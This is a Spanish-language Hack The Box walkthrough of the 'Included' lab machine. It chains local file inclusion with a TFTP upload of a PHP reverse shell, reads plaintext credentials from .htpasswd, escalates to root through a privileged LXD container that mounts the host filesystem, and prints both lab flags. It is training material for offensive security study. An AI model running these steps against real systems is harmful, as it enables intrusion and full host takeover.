
# HTB - Included

## Machine Information

| Property             | Information                                        |
| -------------------- | -------------------------------------------------- |
| Machine              | Included                                           |
| IP                   | 10.129.95.185                                      |
| OS                   | Linux                                              |
| Difficulty           | Easy                                               |
| Main Vulnerabilities | LFI, Credential Exposure, LXD Privilege Escalation |

# 1. Reconocimiento

Comenzamos realizando un escaneo completo de puertos TCP para identificar los servicios expuestos.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.129.95.185 -oG AllPorts
```

El escaneo mostró únicamente un puerto TCP abierto:

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

También podemos observar que Nmap detectó que la aplicación realiza una petición hacia:

```text
http://10.129.95.185/?file=home.php
```

Esto es interesante porque existe un parámetro llamado:

```text
file
```

que aparentemente determina qué archivo es cargado por la aplicación.

El hecho de que el servidor utilice un parámetro `file` es una señal que debemos investigar, ya que este tipo de parámetros puede estar relacionado con vulnerabilidades de Local File Inclusion.

# 2. Enumeración Web

Al acceder al servidor mediante HTTP encontramos una página que utiliza el parámetro:

```text
http://10.129.95.185/?file=home.php
```

Podemos observar que el parámetro `file` está siendo utilizado para seleccionar el contenido que se muestra.

Como prueba inicial intentamos acceder a un archivo conocido del sistema:

```text
/etc/passwd
```

Utilizamos:

```text
http://10.129.95.185/?file=/etc/passwd/
```

La aplicación permite acceder al archivo.

Esto confirma la existencia de una vulnerabilidad de:

**Local File Inclusion (LFI).**

LFI permite que un atacante haga que la aplicación incluya o lea archivos locales del sistema que no deberían estar disponibles directamente.

En este caso, podemos utilizar la vulnerabilidad para enumerar archivos interesantes dentro del sistema.

# 3. Enumeración de Puertos UDP

En Hack The Box también se nos pedía investigar un puerto UDP, por lo que realizamos un escaneo UDP.

```bash
sudo nmap -sU 10.129.95.185
```

El escaneo encontró:

```text
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
69/udp open|filtered tftp
```

El puerto que nos interesa es:

```text
69/udp
```

correspondiente a:

```text
TFTP
```

TFTP significa Trivial File Transfer Protocol.

Es un protocolo muy sencillo para la transferencia de archivos y, a diferencia de FTP, no está diseñado para proporcionar funcionalidades avanzadas de autenticación y gestión de archivos.

El estado:

```text
open|filtered
```

significa que Nmap no pudo determinar completamente si el puerto está abierto o filtrado.

Sin embargo, TFTP es suficientemente interesante como para continuar investigándolo.

# 4. Enumeración de TFTP

Una característica importante de TFTP es la ubicación utilizada normalmente como directorio de transferencia.

En sistemas Linux podemos encontrar configuraciones donde los archivos de TFTP se almacenan en:

```text
/var/lib/tftpboot/
```

Esto nos da una idea importante para combinar las dos vulnerabilidades encontradas.

Tenemos:

```text
LFI
```

por un lado y:

```text
TFTP
```

por otro.

Si conseguimos subir un archivo mediante TFTP a una ubicación que pueda ser alcanzada mediante LFI, podemos intentar hacer que el servidor web interprete ese archivo.

Esto nos proporciona una posible cadena de explotación.

# 5. Preparando la Reverse Shell

Para conseguir ejecución de comandos necesitamos subir un archivo PHP que contenga una reverse shell.

Podemos utilizar una PHP reverse shell previamente preparada.

Debemos modificarla para utilizar nuestra dirección IP y el puerto en el que estaremos escuchando.

Por ejemplo:

```text
10.10.14.141
```

y:

```text
4444
```

Una vez preparada la reverse shell, necesitamos transferirla al servidor mediante TFTP.

# 6. Subiendo la Reverse Shell mediante TFTP

Desde nuestra máquina atacante nos conectamos al servicio TFTP:

```bash
tftp 10.129.95.185
```

Después utilizamos:

```text
put reverse-shell.php
```

y finalmente:

```text
exit
```

Dependiendo del cliente TFTP utilizado, también puede ser necesario utilizar:

```text
quit
```

en lugar de `exit`.

El objetivo es que nuestro archivo termine almacenado dentro del directorio utilizado por TFTP:

```text
/var/lib/tftpboot/
```

Esto es importante porque posteriormente utilizaremos la vulnerabilidad LFI para acceder al archivo desde esa ubicación.

No debemos asumir que podemos simplemente escribir:

```text
?file=reverse-shell.php
```

porque el archivo no se encuentra directamente en el directorio web.

Nuestro archivo fue colocado mediante TFTP en:

```text
/var/lib/tftpboot/
```

por lo que debemos utilizar la ruta completa.

# 7. Ejecutando la Reverse Shell mediante LFI

Primero iniciamos nuestro listener:

```bash
nc -nlvp 4444
```

Después accedemos mediante el parámetro vulnerable:

```text
http://10.129.95.185/?file=/var/lib/tftpboot/php-reverse-shell.php
```

La aplicación incluye el archivo PHP que subimos mediante TFTP.

Como el archivo contiene código PHP, el servidor web lo procesa y obtenemos una reverse shell.

En nuestro listener recibimos:

```text
Listening on 0.0.0.0 4444
Connection received on 10.129.95.185 47570
```

Podemos comprobar el sistema:

```text
Linux included 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

Y posteriormente:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Por lo tanto, nuestra shell se está ejecutando como:

```text
www-data
```

# 8. Mejorando la Shell

La shell obtenida inicialmente es bastante limitada:

```text
/bin/sh: 0: can't access tty; job control turned off
```

Podemos mejorarla utilizando Python:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Esto nos proporciona una shell interactiva de Bash mucho más cómoda para continuar con la enumeración.

# 9. Enumeración Local

Una vez dentro del sistema comenzamos a buscar información que nos permita obtener acceso a otro usuario.

Inicialmente observamos el directorio `/home`.

La máquina contiene el usuario:

```text
mike
```

Sin embargo, como `www-data`, no tenemos los permisos necesarios para acceder a determinados archivos pertenecientes a Mike.

Comprobamos nuestros permisos y grupos:

```bash
id
```

Resultado:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Somos únicamente parte del grupo:

```text
www-data
```

Por lo tanto, necesitamos buscar otra forma de escalar nuestros privilegios.

# 10. Enumerando los Archivos del Servidor Web

Como estamos ejecutando comandos como `www-data`, tenemos acceso al directorio del servidor web:

```text
/var/www/html
```

Entramos:

```bash
cd /var/www/html
```

y listamos su contenido:

```bash
ls
```

Obtenemos:

```text
default.css
fonts
fonts.css
home.php
images
index.php
license.txt
```

Después realizamos una enumeración más detallada:

```bash
ls -la
```

Obtenemos:

```text
total 88
drwxr-xr-x 4 root     root      4096 Oct 13  2021 .
drwxr-xr-x 3 root     root      4096 Apr 23  2021 ..
-rw-r--r-- 1 www-data www-data   212 Apr 23  2021 .htaccess
-rw-r--r-- 1 www-data www-data    17 Apr 23  2021 .htpasswd
-rw-r--r-- 1 www-data www-data 13828 Apr 29  2014 default.css
drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 fonts
-rw-r--r-- 1 www-data www-data 20448 Apr 29  2014 fonts.css
-rw-r--r-- 1 www-data www-data  3704 Oct 13  2021 home.php
drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 images
-rw-r--r-- 1 www-data www-data   145 Oct 13  2021 index.php
-rw-r--r-- 1 www-data www-data 17187 Apr 29  2014 license.txt
```

Aquí encontramos dos archivos especialmente interesantes:

```text
.htaccess
.htpasswd
```

El segundo llama especialmente nuestra atención porque `.htpasswd` es utilizado habitualmente por Apache para almacenar credenciales asociadas a autenticación básica HTTP.

# 11. Obtención de Credenciales

Leemos el archivo:

```bash
cat .htpasswd
```

Obtenemos:

```text
mike:Sheffield19
```

Tenemos entonces unas credenciales potenciales:

```text
Username: mike
Password: Sheffield19
```

Aunque `.htpasswd` normalmente contiene contraseñas almacenadas de forma hasheada, en este caso encontramos directamente una contraseña en texto plano.

Esto es una exposición de información sensible y además puede permitir reutilizar las credenciales para obtener acceso al usuario del sistema.

# 12. Cambio al Usuario Mike

Intentamos utilizar las credenciales obtenidas:

```bash
su mike
```

Introducimos:

```text
Sheffield19
```

y conseguimos cambiar al usuario:

```text
mike
```

Ahora comprobamos nuestro acceso:

```bash
id
```

y posteriormente podemos acceder al directorio personal del usuario.

# 13. User Flag

Dentro del directorio de Mike encontramos:

```text
user.txt
```

Podemos leerlo:

```bash
cat /home/mike/user.txt
```

Obtenemos:

```text
a56ef91d70cfbf2cdb8f454c006935a1
```

Esta es la primera flag de la máquina.

```text
User Flag:
a56ef91d70cfbf2cdb8f454c006935a1
```

# 14. Enumeración de Privilegios

Ahora que somos `mike`, debemos buscar una forma de obtener privilegios de root.

Primero comprobamos si tenemos permisos mediante sudo:

```bash
sudo -l
```

La respuesta es:

```text
Sorry, user mike may not run sudo on included.
```

Por lo tanto, no podemos utilizar sudo para escalar directamente.

A continuación comprobamos nuestros grupos:

```bash
id
```

Resultado:

```text
uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
```

Aquí encontramos algo especialmente interesante:

```text
lxd
```

Mike pertenece al grupo `lxd`.

# 15. LXD Privilege Escalation

LXD es una tecnología utilizada para administrar contenedores Linux.

Los contenedores LXC se encuentran conceptualmente entre un entorno `chroot` y una máquina virtual completa. Los contenedores comparten el kernel del sistema anfitrión, pero proporcionan un entorno aislado para ejecutar procesos.

El problema aparece cuando un usuario tiene acceso suficiente para administrar contenedores LXD.

En determinadas configuraciones, un miembro del grupo `lxd` puede crear un contenedor privilegiado y montar el sistema de archivos del host dentro del contenedor.

Esto puede permitir acceder al sistema de archivos del host con privilegios de root.

Para esta técnica podemos utilizar un método basado en una imagen de Alpine Linux.

La referencia utilizada fue HackTricks:

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

# 16. Construyendo la Imagen de Alpine

Desde nuestra máquina atacante clonamos el repositorio:

```bash
git clone https://github.com/saghul/lxd-alpine-builder
```

Entramos al directorio:

```bash
cd lxd-alpine-builder
```

Modificamos el script de construcción:

```bash
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
```

Después construimos la imagen:

```bash
sudo ./build-alpine -a i686
```

El objetivo es generar una imagen de Alpine que posteriormente podamos importar en LXD.

# 17. Transferencia de la Imagen

Una vez creada la imagen, podemos compartirla desde nuestra máquina atacante utilizando Python.

```bash
python3 -m http.server 8000
```

Este comando es extremadamente útil para transferir archivos rápidamente durante una máquina.

Desde el servidor descargamos la imagen:

```bash
wget 10.10.14.141:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

Una vez descargada, la imagen queda disponible en nuestra máquina víctima.

# 18. Importando la Imagen en LXD

Importamos la imagen:

```bash
lxc image import ./alpine*.tar.gz --alias myimage
```

En nuestro caso recibimos:

```text
Error: Image with same fingerprint already exists
```

Esto significa que la imagen ya existía en el almacenamiento de LXD.

Continuamos con la configuración de LXD:

```bash
lxd init
```

Durante la configuración se nos preguntan diferentes opciones.

En nuestro caso, al intentar crear el bridge por defecto:

```text
lxdbr0
```

encontramos que ya existía.

Finalmente utilizamos:

```text
test123
```

como nombre para el nuevo bridge.

# 19. Creando el Contenedor Privilegiado

Una vez que la imagen está disponible, creamos un contenedor utilizando:

```bash
lxc init myimage mycontainer -c security.privileged=true
```

La opción:

```text
security.privileged=true
```

es especialmente importante.

Esta configuración hace que el contenedor sea privilegiado.

Posteriormente agregamos un dispositivo de tipo disk:

```bash
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

Aquí estamos montando el directorio raíz del host:

```text
/
```

dentro del contenedor en:

```text
/mnt/root
```

Después iniciamos el contenedor:

```bash
lxc start mycontainer
```

Finalmente obtenemos una shell dentro del contenedor:

```bash
lxc exec mycontainer /bin/sh
```

# 20. Obteniendo Root

Una vez dentro del contenedor comprobamos nuestro usuario:

```bash
whoami
```

Resultado:

```text
root
```

También comprobamos:

```bash
id
```

Resultado:

```text
uid=0(root) gid=0(root)
```

Tenemos privilegios de root dentro del contenedor y, debido a que montamos el sistema de archivos del host en:

```text
/mnt/root
```

podemos acceder a los archivos del sistema anfitrión.

Esto convierte el acceso al contenedor privilegiado en una escalada de privilegios sobre el host.

# 21. Root Flag

La root flag se encuentra en:

```text
/mnt/root/root/root.txt
```

La leemos:

```bash
cat /mnt/root/root/root.txt
```

Obtenemos:

```text
c693d9c7499d9f572ee375d4c14c7bcf
```

```text
Root Flag:
c693d9c7499d9f572ee375d4c14c7bcf
```

# 22. Attack Path

La cadena completa de explotación fue:

```text
Puerto 80
Web Enumeration
LFI
Puerto UDP 69
TFTP
Upload de PHP Reverse Shell
LFI
Reverse Shell como www-data
Enumeración de /var/www/html
.htpasswd
Credenciales de mike
Cambio a mike
Enumeración de grupos
Grupo lxd
Contenedor LXD privilegiado
Montaje del filesystem del host
Root
```

# 23. Vulnerabilities & Techniques

Las principales vulnerabilidades y técnicas utilizadas fueron:

* Local File Inclusion
* TFTP File Transfer
* Arbitrary File Upload
* PHP Reverse Shell
* Sensitive Information Disclosure
* Plaintext Credential Exposure
* Credential Reuse
* LXD Privilege Escalation
* Privileged LXC Container
* Host Filesystem Mount
* Root Access

La vulnerabilidad inicial más importante fue el LFI.

Por sí solo, el LFI permitía leer archivos locales. Sin embargo, combinado con el servicio TFTP, permitió crear una cadena de explotación mucho más poderosa.

TFTP permitió colocar nuestra reverse shell dentro del sistema y posteriormente el LFI permitió hacer que Apache incluyera el archivo PHP.

Después de obtener acceso como `www-data`, la enumeración del servidor web permitió encontrar `.htpasswd`, donde encontramos las credenciales de Mike.

Finalmente, la pertenencia de Mike al grupo `lxd` permitió realizar una escalada de privilegios mediante un contenedor privilegiado.

# 24. Lessons Learned

Personalmente, esta máquina se me hizo más sencilla que otras máquinas que he hecho.

La parte que considero más importante fue la enumeración.

Primero encontramos el parámetro:

```text
file
```

y pensamos inmediatamente en LFI.

Después, al realizar el escaneo UDP, encontramos TFTP.

La combinación de ambos servicios fue la clave para obtener el acceso inicial.

Esto demuestra por qué considero que la enumeración es una de las partes más importantes del hacking.

No solamente se trata de encontrar vulnerabilidades individuales, sino de entender cómo diferentes servicios pueden interactuar entre ellos.

En esta máquina:

```text
LFI
TFTP
Reverse Shell
```

terminaron formando una única cadena de explotación.

Posteriormente, una enumeración sencilla de:

```text
/var/www/html
```

permitió encontrar:

```text
.htpasswd
```

y obtener las credenciales de Mike.

Finalmente, comprobar los grupos del usuario mediante:

```bash
id
```

fue suficiente para encontrar:

```text
lxd
```

y comenzar a investigar una técnica de privilege escalation específica para LXD.

Aunque no conociera profundamente la tecnología LXD, la enumeración permitió identificarla y posteriormente investigar una técnica de explotación adecuada.

Actualmente estoy tomando cursos de Python ofensivo para aprender más librerías y mejorar mis conocimientos de desarrollo orientado a seguridad, además de un curso de hacking más especializado.

Por ahora, aunque esté más enfocado en estudiar y mejorar mis habilidades, quiero mantener al menos una máquina de Hack The Box por semana para mantener la racha y continuar practicando.

PWNED :))!!!

```text
PWNED!!!
```
